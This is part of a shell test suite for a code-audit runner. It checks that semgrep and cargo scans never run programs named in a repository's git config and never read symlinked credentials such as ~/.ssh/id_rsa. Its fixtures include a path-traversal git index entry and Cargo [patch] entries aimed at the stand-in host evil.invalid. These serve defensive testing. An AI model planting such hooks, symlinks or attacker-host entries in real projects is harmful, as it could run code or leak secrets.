check "a .semgrepignore under the path is named in the last line" sh -c "[ '$RC' = 0 ] && grep -q '; note: .semgrepignore files narrow the scan: src/.semgrepignore\$' '$T/out'"
rm -f "$WT/src/.semgrepignore"
# semgrep reads every .semgrepignore of its project, so one at the repository's top, or in a folder between it
# and the scan root, narrows the scan of a folder below them: the note names each, from the top down. A file
# given as --path is scanned whatever they say.
printf 'programs/\n' > "$WT/.semgrepignore"
printf 'demo/\n' > "$WT/programs/.semgrepignore"
run "$SAST" "$WT" -- semgrep --run audit_1 --path programs/demo --ruleset p/rust
check "a .semgrepignore at the repository's top and one between it and --path are named, from the top down" \
  sh -c "[ '$RC' = 0 ] && grep -q '; note: .semgrepignore files narrow the scan: .semgrepignore, programs/.semgrepignore\$' '$T/out'"
run "$SAST" "$WT" -- semgrep --run audit_1 --path programs/demo/src/lib.rs --ruleset p/rust
check "... and a file given as --path gets no note" sh -c "[ '$RC' = 0 ] && grep -q '^>> semgrep: ' '$T/out' && ! grep -q 'note:' '$T/out'"
# The scan root's own project can be another repository. One with a .git directory gets its own copy of its
# index; one with a .git file (a submodule's, or a separate git directory) gets none, so git finds no
# repository and semgrep lists the files itself, which the last line says. Each config names the programs and
# hooks that leave marks, and the marks of earlier runs are set aside for each case (and put back after), so
# each check counts its own. A folder shaped as a bare repository is part of the working directory's project:
# plain git, run from it, takes it for a bare repository with no work tree and runs none of its programs
# either, so that case shows only that it is never consulted. An index with an entry that climbs out of the
# project (no git command writes one; git lists it) gets no copy either, nor does a split index (git cannot read
# its copy without the shared index beside it); the note says which.
tgit init -q "$WT/nested" && printf 'fn n() {}\n' > "$WT/nested/n.rs" && tgit -C "$WT/nested" add n.rs &&
  printf '[core]\n\tfsmonitor = %s/mark-fsmonitor\n\thooksPath = %s/hooks\n' "$T" "$T" >> "$WT/nested/.git/config"
tgit init -q --separate-git-dir "$T/gf.git" "$WT/gf" && printf 'fn g() {}\n' > "$WT/gf/g.rs" &&
  printf '[core]\n\tfsmonitor = %s/mark-fsmonitor\n\thooksPath = %s/hooks\n' "$T" "$T" >> "$T/gf.git/config"
mkdir -p "$WT/bare/objects" "$WT/bare/refs" && printf 'ref: refs/heads/main\n' > "$WT/bare/HEAD" &&
  printf '[core]\n\tbare = false\n\tworktree = %s\n\tfsmonitor = %s/mark-fsmonitor\n\thooksPath = %s/hooks\n' "$WT/bare" "$T" "$T" > "$WT/bare/config"
tgit init -q "$WT/idx" && printf 'fn i() {}\n' > "$WT/idx/i.rs" && tgit -C "$WT/idx" add i.rs && python3 -I - "$WT/idx/.git/index" <<'PY'
import hashlib, struct, sys
# Insert the entry a/../../outside.rs (it sorts first) before the one i.rs entry, as a version 2 index holds it.
p = sys.argv[1]
data = open(p, "rb").read()
sig, ver, n = struct.unpack(">4sII", data[:12])
body = data[12:-20]
fixed = bytearray(body[:62])
name = b"a/../../outside.rs"
struct.pack_into(">H", fixed, 60, len(name))
entry = bytes(fixed) + name
entry += b"\0" * ((62 + len(name) + 8) // 8 * 8 - len(entry))
out = struct.pack(">4sII", sig, ver, n + 1) + entry + body
open(p, "wb").write(out + hashlib.sha1(out).digest())
PY
for r in split info unread exunread gitnox infonox; do
  tgit init -q "$WT/$r" && printf 'fn s() {}\n' > "$WT/$r/s.rs" && tgit -C "$WT/$r" add s.rs &&
    printf '[core]\n\tfsmonitor = %s/mark-fsmonitor\n\thooksPath = %s/hooks\n' "$T" "$T" >> "$WT/$r/.git/config"
done
tgit -C "$WT/split" update-index --split-index
mv "$WT/info/.git/info" "$T/info-real" && ln -s "$T/info-real" "$WT/info/.git/info"
WALKED='; note: semgrep listed the files itself, not with git (no copy of the repository index: '
shape_ok() { # shape_ok <calls line> <reason>: exit 0, no mark, that line in the calls, and the note with <reason> (none when empty)
  [ "$RC" = 0 ] && [ -z "$(ls -A "$T/marks")" ] && grep -q "$1" "$T/calls" || return 1
  if [ -n "$2" ]; then grep -qF "$WALKED$2), so files a .gitignore leaves out can be in the scan" "$T/out"; else ! grep -qF "$WALKED" "$T/out"; fi
}
mkdir -p "$T/marks-earlier"
while IFS='|' read -r path want why label; do
  mv "$T/marks/"* "$T/marks-earlier/" 2>/dev/null
  run "$SAST" "$WT" -- semgrep --run audit_1 --path "$path" --ruleset p/rust
  check "sast --path $path, $label: exit 0, and semgrep's git ran nothing a config names (calls: $want)" shape_ok "$want" "$why"
done <<CASES
nested|^git-cached: 0 n.rs \$||its own .git directory: a copy of its own index
gf|^git-cached: 128 fatal: not a git repository|its .git is a file or a link|a .git file: no copy, git finds no repository
bare|^env: GIT_WORK_TREE=$WT\$||a folder shaped as a bare repository: never consulted, the working directory's copy
idx|^git-cached: 128 fatal: not a git repository|its index names a path outside the repository|an index entry outside the project: no copy
split|^git-cached: 128 fatal: not a git repository|git cannot read its index from a copy, as with a split index or a sha256 repository|a split index: no copy
CASES
# An index that cannot be read gets no copy either, and neither does one in a .git that cannot be searched: there
# it only looks absent, and a copy made without it would hold no tracked file. An info/exclude sast.sh does not
# copy (in a .git/info that is a link, or that cannot be searched, or one that cannot be read) leaves the copy
# without it: git then lists what the project's own git lists when it cannot read that file, the untracked
# skip/x.rs its rule names included, and the note says so. Where the modes stop nothing, as for root, the case is
# skipped.
EXCLUDED="; note: semgrep's git read the repository index without its info/exclude ("
excl_ok() { # excl_ok <calls line> <reason>: exit 0, no mark, that line in the calls, and the note with <reason>, not the walk's
  [ "$RC" = 0 ] && [ -z "$(ls -A "$T/marks")" ] && grep -q "$1" "$T/calls" && ! grep -qF "$WALKED" "$T/out" &&
    grep -qF "$EXCLUDED$2), so files only that file leaves out can be in the scan" "$T/out"
}
for r in exunread infonox; do
  mkdir -p "$WT/$r/.git/info" "$WT/$r/skip" && printf 'skip/\n' > "$WT/$r/.git/info/exclude" && printf 'fn x() {}\n' > "$WT/$r/skip/x.rs"
done
chmod 000 "$WT/unread/.git/index" "$WT/exunread/.git/info/exclude"
chmod 600 "$WT/gitnox/.git" "$WT/infonox/.git/info"
while IFS='|' read -r path probe want why label; do
  if [ -n "$probe" ] && [ -r "$WT/$probe" ]; then skp "sast --path $path, $label: this user reads $probe whatever its mode"; continue; fi
  mv "$T/marks/"* "$T/marks-earlier/" 2>/dev/null
  run "$SAST" "$WT" -- semgrep --run audit_1 --path "$path" --ruleset p/rust
  case "$want" in
    walk) check "sast --path $path, $label: exit 0, no copy and the note says why, nothing a config names ran" \
      shape_ok '^git-cached: 128 fatal: not a git repository' "$why" ;;
    *) check "sast --path $path, $label: exit 0, the index copied without it and the note says why, nothing a config names ran" \
      excl_ok "$want" "$why" ;;
  esac
done <<CASES
unread|unread/.git/index|walk|its index cannot be read|an index that cannot be read
gitnox|gitnox/.git/index|walk|its index cannot be read|a .git that cannot be searched
exunread|exunread/.git/info/exclude|^git-others: 0 skip/x.rs \$|its info/exclude cannot be read|an info/exclude that cannot be read
infonox|infonox/.git/info/exclude|^git-others: 0 skip/x.rs \$|its info/exclude cannot be read|a .git/info that cannot be searched
info||^git-cached: 0 s.rs \$|its .git/info is a link|a .git/info that is a link
CASES
chmod 700 "$WT/gitnox/.git" "$WT/infonox/.git/info"
# A working directory inside a repository whose top lies above it: sast.sh copies nothing from outside the
# working directory, so semgrep lists the files itself; the outer repository's programs never run.
tgit init -q "$T/outer" && mkdir "$T/outer/w" && printf 'fn o() {}\n' > "$T/outer/w/o.rs" &&
  printf '[core]\n\tfsmonitor = %s/mark-fsmonitor\n\thooksPath = %s/hooks\n' "$T" "$T" >> "$T/outer/.git/config" &&
  ( cd "$T/outer/w" && "$ROOT/scripts/rundir.sh" new audit ) >/dev/null || ko "the outer repository's working directory could not be made"
mv "$T/marks/"* "$T/marks-earlier/" 2>/dev/null
run "$SAST" "$T/outer/w" -- semgrep --run audit_1 --path . --ruleset p/rust
check "sast in a working directory below its repository's top: exit 0, no copy and the note says why, nothing a config names ran" \
  shape_ok '^git-cached: 128 fatal: not a git repository' 'the repository lies above the working directory'
mv "$T/marks-earlier/"* "$T/marks/" 2>/dev/null
rmdir "$T/marks-earlier"
# git init records whether letter case tells names apart and, on macOS, that names are precomposed; with the
# same two keys in sast.sh's config, git lists what the project's own git lists: here a tracked A.rs renamed
# on disk to a.rs, an untracked target/t.rs under a .gitignore of Target/, and a file named in decomposed
# form. Where the filesystem tells such names apart, both lists hold them.
tgit init -q "$WT/ci" && printf 'Target/\n' > "$WT/ci/.gitignore" && printf 'fn a() {}\n' > "$WT/ci/A.rs" &&
  printf 'fn u() {}\n' > "$WT/ci/u$(printf '\314\210').rs" && tgit -C "$WT/ci" add -A && mv "$WT/ci/A.rs" "$WT/ci/a.rs" &&
  mkdir "$WT/ci/target" && printf 'fn t() {}\n' > "$WT/ci/target/t.rs"
cached=$(tgit -C "$WT/ci" ls-files -z --cached | tr '\0' ' ')
others=$(tgit -C "$WT/ci" ls-files -z --others --exclude-standard | tr '\0' ' ')
run "$SAST" "$WT" -- semgrep --run audit_1 --path ci --ruleset p/rust
check "a project's own copy lists the tracked and untracked files its own git lists (others: ${others:-none})" \
  sh -c "[ '$RC' = 0 ] && grep -qxF 'git-cached: 0 $cached' '$T/calls' && grep -qxF 'git-others: 0 $others' '$T/calls'"
rm -rf "$WT/ci"
printf 'y/\n' > "$WT/nested/.semgrepignore"
run "$SAST" "$WT" -- semgrep --run audit_1 --path nested --ruleset p/rust
check "a scan root in a project of its own: the note names its .semgrepignore, not the working directory's" \
  sh -c "[ '$RC' = 0 ] && grep -q '; note: .semgrepignore files narrow the scan: nested/.semgrepignore\$' '$T/out'"
rm -rf "$WT/nested" "$WT/gf" "$WT/bare" "$WT/idx" "$WT/split" "$WT/info" "$WT/unread" "$WT/exunread" "$WT/gitnox" "$WT/infonox" \
  "$T/info-real" "$T/outer" "$T/gf.git" "$WT/.semgrepignore" "$WT/programs/.semgrepignore"
# Symbolic links under --path. Strict mode refuses one that resolves outside --path. Otherwise one that resolves
# inside the working directory is scanned as semgrep finds it, and one that resolves outside it is left out:
# semgrep gets, instead of --path, the entries of each folder on the way to it, never the link, and the last
# line names it. A node_modules folder holding such a link is left out whole, and so is every folder on the way
# below --path when the paths would pass 5000.
mkdir -p "$WT/src/inner"
ln -s ../lib.rs "$WT/src/inner/near.rs"
for strict in "" 1; do
  run "$SAST" "$WT" ${strict:+AUDITOR_STRICT=1} -- semgrep --run audit_1 --path src --ruleset p/rust
  check "a link under --path that stays inside it is fine${strict:+ in strict mode}" sh -c "[ '$RC' = 0 ] && ! grep -q 'left out' '$T/out'"
done
ln -s ../../a.rs "$WT/src/inner/out.rs"
run "$SAST" "$WT" AUDITOR_STRICT=1 -- semgrep --run audit_1 --path src --ruleset p/rust
check "strict mode, a link under --path to another part of the working directory is refused" \
  sh -c "[ '$RC' = 64 ] && grep -qxF 'sast: refused: --path holds a symbolic link that resolves outside it, src/inner/out.rs; semgrep could read and quote what it points to, so scan a directory without it' '$T/err'"
run "$SAST" "$WT" -- semgrep --run audit_1 --path src --ruleset p/rust
check "... while outside strict mode it is scanned as semgrep finds it: --path whole, no note" \
  sh -c "[ '$RC' = 0 ] && grep -q -- '--error -- $WT/src\$' '$T/calls' && ! grep -q 'left out' '$T/out'"
for strict in "" 1; do
  run "$SAST" "$WT" ${strict:+AUDITOR_STRICT=1} -- semgrep --run audit_1 --path . --ruleset p/rust
  check "... and the same link is fine when --path holds what it points to${strict:+, in strict mode}" test "$RC" = 0
done
rm -f "$WT/src/inner/out.rs"
ln -s "$CREDHOME/.ssh/id_rsa" "$WT/src/inner/key.rs"
run "$SAST" "$WT" AUDITOR_STRICT=1 -- semgrep --run audit_1 --path . --ruleset p/secrets
check "strict mode, a link that resolves outside the working directory is refused before anything is sent" \
  sh -c "[ '$RC' = 64 ] && grep -qxF 'sast: refused: --path holds a symbolic link that resolves outside it, src/inner/key.rs; semgrep could read and quote what it points to, so scan a directory without it' '$T/err' && [ ! -s '$T/calls' ] && [ -z \"\$(ls -A '$NT')\" ]"
r0=$(rows)
run "$SAST" "$WT" -- semgrep --run audit_1 --path . --ruleset p/secrets
check "a link that resolves outside the working directory: exit 0, and semgrep gets the entries around it, never the link" \
  sh -c "[ '$RC' = 0 ] && grep -q '^== semgrep scan --config p/secrets .* --error -- $WT/.cargo .* $WT/a.rs .* $WT/src/inner/near.rs $WT/src/lib.rs .*' '$T/calls' && ! grep -q 'key.rs' '$T/calls' && ! grep -q -- '-- $WT\$' '$T/calls'"
check "... the last line names the link left out, and the scan was disclosed as usual" \
  sh -c "sed -n '\$p' '$T/out' | grep -q '^>> semgrep: 0 results (exit 0): .*; note: left out 1 symbolic link that resolves outside the working directory: src/inner/key.rs\$' && [ \$(( \$(wc -l < '$DT') - 1 - $r0 )) = 1 ]"
# A link inside the working directory to a folder that leads to such a link would hand semgrep the link it left
# out by another name: it is left out too, under --path (alias -> src) and from a folder outside it
# (app/shared -> ../src, scanning app), and so is a folder the check cannot read.
ln -s src "$WT/alias"
ln -s ../src "$WT/app/shared"
run "$SAST" "$WT" -- semgrep --run audit_1 --path . --ruleset p/secrets
check "a link to a folder that holds such a link is left out, and the note names it" \
  sh -c "[ '$RC' = 0 ] && ! grep -qE '^== semgrep .* $WT/alias( |\$)' '$T/calls' && ! grep -q 'key.rs' '$T/calls' && sed -n '\$p' '$T/out' | grep -q '; note: left out 1 symbolic link that resolves outside the working directory: src/inner/key.rs; note: left out 2 symbolic links to folders that lead to such links: alias, app/shared\$'"
mkdir -p "$WT/chain/a" "$WT/chain/b"
printf 'fn c() {}\n' > "$WT/chain/a/c.rs"
ln -s ../b "$WT/chain/a/to-b" && ln -s ../../src "$WT/chain/b/to-src" && ln -s .. "$WT/app/up"
run "$SAST" "$WT" -- semgrep --run audit_1 --path app --ruleset p/secrets
check "... and from a --path the folder lies outside of, a link to an ancestor of --path among them" \
  sh -c "[ '$RC' = 0 ] && grep -q -- '--error -- $WT/app/Anchor.toml $WT/app/Cargo.toml $WT/app/yarn.lock\$' '$T/calls' && sed -n '\$p' '$T/out' | grep -q '; note: left out 2 symbolic links to folders that lead to such links: app/shared, app/up\$'"
run "$SAST" "$WT" -- semgrep --run audit_1 --path chain/a --ruleset p/secrets
check "... and through a chain of such links" \
  sh -c "[ '$RC' = 0 ] && grep -q -- '--error -- $WT/chain/a/c.rs\$' '$T/calls' && sed -n '\$p' '$T/out' | grep -q '; note: left out 1 symbolic link to a folder that leads to such a link: chain/a/to-b\$'"
rm -f "$WT/alias" "$WT/app/shared" "$WT/app/up" "$WT/src/inner/key.rs"
ln -s ../a "$WT/chain/b/to-a" && rm -f "$WT/chain/b/to-src"
run "$SAST" "$WT" -- semgrep --run audit_1 --path chain --ruleset p/secrets
check "a loop of such links with no link out of the working directory: --path whole, no note" \
  sh -c "[ '$RC' = 0 ] && grep -q -- '--error -- $WT/chain\$' '$T/calls' && ! grep -q 'left out' '$T/out'"
rm -rf "$WT/chain"
if [ "$(id -u)" != 0 ]; then
  mkdir -p "$WT/locked"
  printf 'fn l() {}\n' > "$WT/locked/l.rs"
  chmod 311 "$WT/locked"
  run "$SAST" "$WT" -- semgrep --run audit_1 --path . --ruleset p/rust
  chmod 700 "$WT/locked"
  check "a folder the link check cannot read is left out, and the note names it" \
    sh -c "[ '$RC' = 0 ] && ! grep -qE '^== semgrep .* $WT/locked( |\$)' '$T/calls' && sed -n '\$p' '$T/out' | grep -q '; note: left out 1 folder or entry the link check could not read: locked\$'"
  rm -rf "$WT/locked"
fi
mkdir -p "$WT/app/node_modules/pkg"
ln -s "$CREDHOME/.ssh" "$WT/app/node_modules/keys"
run "$SAST" "$WT" -- semgrep --run audit_1 --path app --ruleset p/secrets
check "a link out of the working directory in node_modules: the folder is left out whole, and the note says so" \
  sh -c "[ '$RC' = 0 ] && grep -q -- '--error -- $WT/app/Anchor.toml $WT/app/Cargo.toml $WT/app/yarn.lock\$' '$T/calls' && sed -n '\$p' '$T/out' | grep -q '; note: left out 1 symbolic link that resolves outside the working directory: app/node_modules/keys; note: left out whole 1 folder that holds such a link: app/node_modules\$'"
run "$SAST" "$WT" AUDITOR_STRICT=1 -- semgrep --run audit_1 --path app --ruleset p/secrets
check "... which strict mode refuses" \
  sh -c "[ '$RC' = 64 ] && grep -qxF 'sast: refused: --path holds a symbolic link that resolves outside it, app/node_modules/keys; semgrep could read and quote what it points to, so scan a directory without it' '$T/err'"
rm -rf "$WT/app/node_modules"
mkdir -p "$WT/many/flat"
python3 -I -c 'import sys
for i in range(5001):
    open("%s/f%04d.rs" % (sys.argv[1], i), "w").close()' "$WT/many/flat"
printf 'fn m() {}\n' > "$WT/many/m.rs"
ln -s "$CREDHOME/.ssh/id_rsa" "$WT/many/flat/key.rs"
run "$SAST" "$WT" -- semgrep --run audit_1 --path many --ruleset p/secrets
check "past 5000 paths around such a link, the folder on the way is left out whole" \
  sh -c "[ '$RC' = 0 ] && grep -q -- '--error -- $WT/many/m.rs\$' '$T/calls' && sed -n '\$p' '$T/out' | grep -q '; note: left out 1 symbolic link that resolves outside the working directory: many/flat/key.rs; note: left out whole 1 folder that holds such a link: many/flat\$'"
# When --path itself holds more, semgrep runs once for each 5000 of them, and one SARIF holds a run for each.
settings FAKE_RESULTS=2 FAKE_SEMGREP_RC=1
run "$SAST" "$WT" -- semgrep --run audit_1 --path many/flat --ruleset p/secrets
check "... and when --path itself holds more, semgrep runs twice, never on the link, and the last line says so" \
  sh -c "[ '$RC' = 1 ] && [ \"\$(grep -c '^== semgrep ' '$T/calls')\" = 2 ] && ! grep -q 'key[.]rs' '$T/calls' && sed -n '\$p' '$T/out' | grep -q '^>> semgrep: 4 results (exit 1): audit_1/sast/semgrep-[0-9]*[.]sarif; log .*; note: left out 1 symbolic link that resolves outside the working directory: many/flat/key.rs; note: the 5001 paths were too many for one semgrep call, so it ran 2 times, on at most 5000 each, and the SARIF holds one run for each\$'"
kept=$(sed -n 's/^>> semgrep: [0-9]* results (exit 1): \(audit_1\/sast\/semgrep-[0-9]*[.]sarif\);.*/\1/p' "$T/out")
check "... the kept SARIF holds both runs, two results in each" python3 -I -c 'import json, sys
runs = json.load(open(sys.argv[1]))["runs"]
sys.exit(0 if [len(r["results"]) for r in runs] == [2, 2] else 1)' "$WT/$kept"
settings FAKE_SLEEP=3
run "$SAST" "$WT" AUDITOR_RUN_TIMEOUT=5 -- semgrep --run audit_1 --path many/flat --ruleset p/secrets
check "... AUDITOR_RUN_TIMEOUT bounds the two calls together" \
  sh -c "[ '$RC' = 3 ] && grep -q '^sast: blocker: semgrep passed the 5-second limit (AUDITOR_RUN_TIMEOUT) and was killed' '$T/err' && [ \"\$(grep -c '^== semgrep ' '$T/calls')\" = 2 ]"
settings
rm -rf "$WT/src/inner" "$WT/many"
run "$SAST" "$WT" PATH="$SPATH" -- semgrep --run audit_1 --path . --ruleset p/rust
check "sast without semgrep: exit 3, nothing sent" sh -c "[ '$RC' = 3 ] && grep -qxF 'sast: blocker: semgrep is not on PATH, so the scan cannot run here — nothing was sent.' '$T/err' && [ -z \"\$(ls -A '$NT')\" ]"

# =================================================================================================
# The real tools, where they are installed: one case per action, offline, nothing downloaded. $T/realwt
# is a repository with a crate of no dependencies (a cdylib with one passing test; a second commit makes the
# test fail) and a package.json and lock with no dependencies. Semgrep has no such case: its rulesets come
# from semgrep.dev, and sast.sh takes no local rules.
# =================================================================================================
RW=$T/realwt
mkdir -p "$RW/src"
tgit init -q "$RW" && tgit -C "$RW" symbolic-ref HEAD refs/heads/main
printf '[package]\nname = "realpkg"\nversion = "0.1.0"\nedition = "2021"\n\n[lib]\ncrate-type = ["cdylib", "lib"]\n\n[dependencies]\n' > "$RW/Cargo.toml"
printf '#[no_mangle]\npub extern "C" fn entrypoint(_input: *mut u8) -> u64 {\n    0\n}\n\n#[cfg(test)]\nmod tests {\n    #[test]\n    fn holds() {\n        assert_eq!(2 + 2, 4);\n    }\n}\n' > "$RW/src/lib.rs"
printf '{\n  "name": "realpkg",\n  "version": "1.0.0"\n}\n' > "$RW/package.json"
printf '{\n  "name": "realpkg",\n  "version": "1.0.0",\n  "lockfileVersion": 3,\n  "requires": true,\n  "packages": {\n    "": {\n      "name": "realpkg",\n      "version": "1.0.0"\n    }\n  }\n}\n' > "$RW/package-lock.json"
tgit -C "$RW" add -A && tgit -C "$RW" commit -qm passing
PASSING=$(tgit -C "$RW" rev-parse HEAD)
sed 's/2 + 2, 4/2 + 2, 5/' "$RW/src/lib.rs" > "$RW/src/lib.rs.new" && mv "$RW/src/lib.rs.new" "$RW/src/lib.rs"
tgit -C "$RW" commit -qam failing
( cd "$RW" && "$ROOT/scripts/rundir.sh" new audit ) >/dev/null && printf 'native\n' > "$RW/audit_1/exec-mode"
printf '# generated\nversion = 3\n\n[[package]]\nname = "realpkg"\nversion = "0.1.0"\n' > "$RW/Cargo.lock"
TOOL_HOMES=(CARGO_HOME="${CARGO_HOME:-$REAL_HOME/.cargo}" RUSTUP_HOME="${RUSTUP_HOME:-$REAL_HOME/.rustup}")
on_real_path() { PATH=$REAL_PATH command -v "$1" >/dev/null 2>&1; }
if on_real_path cargo && on_real_path rustup; then
  run "$TARGET" "$RW" PATH="$REAL_PATH" "${TOOL_HOMES[@]}" -- cargo-test --run audit_1 --src . --rev "$PASSING"
  check "real cargo test, in the copy outside the working directory: exit 0" sh -c "[ '$RC' = 0 ] && grep -q 'test tests::holds ... ok' \"$RW/\$(sed -n 's/.*; log \\(audit_1[^;]*[.]log\\).*/\\1/p' '$T/out')\""
  run "$TARGET" "$RW" PATH="$REAL_PATH" "${TOOL_HOMES[@]}" -- cargo-test --run audit_1 --src .
  check "real cargo test of a commit whose test fails: exit 1" sh -c "[ '$RC' = 1 ] && grep -q '^>> cargo-test: cargo test failed (exit 101)' '$T/out'"
  if (cd "$T" && env PATH="$REAL_PATH" cargo clippy --version) >/dev/null 2>&1; then
    run "$TARGET" "$RW" PATH="$REAL_PATH" "${TOOL_HOMES[@]}" -- clippy --run audit_1 --src . --rev "$PASSING"
    check "real cargo clippy: exit 0" sh -c "[ '$RC' = 0 ] && grep -q '^>> clippy: ok (exit 0)' '$T/out'"
  else
    skp "cargo clippy is not installed for the default toolchain"
  fi
  run "$DEPS" "$RW" PATH="$REAL_PATH" "${TOOL_HOMES[@]}" -- cargo-tree --run audit_1 --manifest Cargo.toml --manifest Cargo.lock
  check "real cargo tree on the copied manifests: exit 0, the package and its stub" \
    sh -c "[ '$RC' = 0 ] && grep -q '^realpkg v0.1.0' \"$RW/\$(sed -n 's/.*: \\(audit_1\\/deps\\/cargo-tree-[0-9]*[.]txt\\)\$/\\1/p' '$T/out')\""
  # A [patch] with git and registry-index entries runs through the rebuild, and cargo tries crates.io only:
  # every proxy variable points at a closed local port, so nothing leaves the machine, and cargo names in its
  # output each host it tries.
  mkdir -p "$RW/rp"
  printf '[package]\nname = "rp"\nversion = "0.1.0"\nedition = "2021"\n\n[dependencies]\nanyhow = "1"\n\n[patch.crates-io]\nanyhow = { version = "1", registry-index = "sparse+https://evil.invalid/" }\nserde = { git = "https://evil.invalid/serde" }\n' > "$RW/rp/Cargo.toml"
  CLOSED=http://127.0.0.1:9
  run "$DEPS" "$RW" PATH="$REAL_PATH" "${TOOL_HOMES[@]}" HTTPS_PROXY="$CLOSED" HTTP_PROXY="$CLOSED" ALL_PROXY="$CLOSED" \
    https_proxy="$CLOSED" http_proxy="$CLOSED" all_proxy="$CLOSED" AUDITOR_RUN_TIMEOUT=120 -- cargo-tree --run audit_1 --manifest rp/Cargo.toml
  kept=$(sed -n 's/.*\(audit_1\/deps\/cargo-tree-[0-9]*[.]txt\)$/\1/p' "$T/out" "$T/err" | sed -n 1p)
  check "real cargo: a [patch] with git and registry-index entries tries crates.io only, never a host it names" sh -c "
    { [ '$RC' = 0 ] || [ '$RC' = 3 ]; } && [ -n '$kept' ] && grep -q 'crates.io' '$RW/$kept' &&
    ! grep -q evil '$RW/$kept' '$T/out' '$T/err' &&
    grep -qxF '>> note: rp/Cargo.toml holds a [patch] or [replace] table, which this tree does not apply: anyhow, serde' '$T/err'"
  # A workspace member outside the root's directory that names the root with package.workspace, which real
  # cargo metadata takes: refused, and nothing lands beside the scratch directory ($T/canary-real/m).
  mkdir -p "$RW/oor/a/b/c" "$RW/oor/canary-real/m"
  printf '[workspace]\nmembers = ["../../../canary-real/m"]\nresolver = "2"\n\n[package]\nname = "oor-root"\nversion = "0.1.0"\nedition = "2021"\n' > "$RW/oor/a/b/c/Cargo.toml"
  printf '[package]\nname = "oor-member"\nversion = "0.1.0"\nedition = "2021"\nworkspace = "../../a/b/c"\n' > "$RW/oor/canary-real/m/Cargo.toml"
  run "$DEPS" "$RW" PATH="$REAL_PATH" "${TOOL_HOMES[@]}" -- cargo-tree --run audit_1 --manifest oor/a/b/c/Cargo.toml --manifest oor/canary-real/m/Cargo.toml
  check "real cargo metadata with a workspace member outside the root: exit 3, refused before anything lands outside the scratch directory" sh -c "
    [ '$RC' = 3 ] && grep -q '^deps: blocker: the workspace member oor/canary-real/m lies outside the workspace root, oor/a/b/c; ' '$T/err' && [ ! -e '$T/canary-real' ]"
  if on_real_path cargo-audit && [ -d "${CARGO_HOME:-$REAL_HOME/.cargo}/advisory-db" ]; then
    run "$DEPS" "$RW" PATH="$REAL_PATH" "${TOOL_HOMES[@]}" -- cargo-audit --run audit_1 --manifest Cargo.lock --no-fetch
    check "real cargo audit --no-fetch against the database in CARGO_HOME: exit 0" sh -c "[ '$RC' = 0 ] && grep -q '^>> cargo-audit: no vulnerability found (exit 0)' '$T/out'"
  else
    skp "cargo-audit is not installed, or CARGO_HOME holds no advisory database to use without fetching"
  fi
  sbf_tools=$( (cd "$T" && env PATH="$REAL_PATH" cargo-build-sbf --version) 2>/dev/null | sed -n 's/^platform-tools \(v[0-9.]*\).*/\1/p')
  if on_real_path cargo-build-sbf && [ -n "$sbf_tools" ] && [ -d "$REAL_HOME/.cache/solana/$sbf_tools/platform-tools" ]; then
    run "$TARGET" "$RW" HOME="$REAL_HOME" PATH="$REAL_PATH" "${TOOL_HOMES[@]}" -- build-sbf --run audit_1 --src . --rev "$PASSING"
    so=$(sed -n 's/.*1 .so in \(audit_1\/exec\/build-sbf-[0-9]*\)\/: realpkg[.]so$/\1/p' "$T/out")
    check "real cargo build-sbf ($sbf_tools, already installed): exit 0, an ELF kept in R/exec" \
      sh -c "[ '$RC' = 0 ] && [ -n '$so' ] && [ \"\$(head -c 4 '$RW/$so/realpkg.so' | od -An -c | tr -d ' ')\" = '177ELF' ]"
  else
    skp "cargo-build-sbf, or its default platform tools, are not installed here (the real case would download them)"
  fi
elif [ "${REQUIRE_TOOLCHAIN:-}" = 1 ]; then
  ko "REQUIRE_TOOLCHAIN=1, but cargo or rustup is not on PATH: the real-toolchain cases cannot run"
else
  skp "cargo or rustup is not on PATH: the real-toolchain cases are skipped"
fi
if on_real_path npm && on_real_path node; then
  run "$TARGET" "$RW" PATH="$REAL_PATH" -- npm-ci --run audit_1 --src .
  check "real npm ci --ignore-scripts of a lockfile with no dependencies: exit 0" sh -c "[ '$RC' = 0 ] && grep -q '^>> npm-ci: ok (exit 0)' '$T/out'"
  run "$DEPS" "$RW" PATH="$REAL_PATH" -- npm-audit --run audit_1 --manifest package.json --manifest package-lock.json
  check "real npm audit of a lockfile with no dependencies: exit 0" sh -c "[ '$RC' = 0 ] && grep -q '^>> npm-audit: no vulnerability found (exit 0)' '$T/out'"
else
  skp "npm or node is not on PATH: the real npm cases are skipped"
fi
check "no run in this suite ran a program or hook a source repository's config names" test -z "$(ls -A "$T/marks")"

echo
echo "runner tests: $pass passed, $fail failed, $skip skipped"
[ "$fail" -eq 0 ]
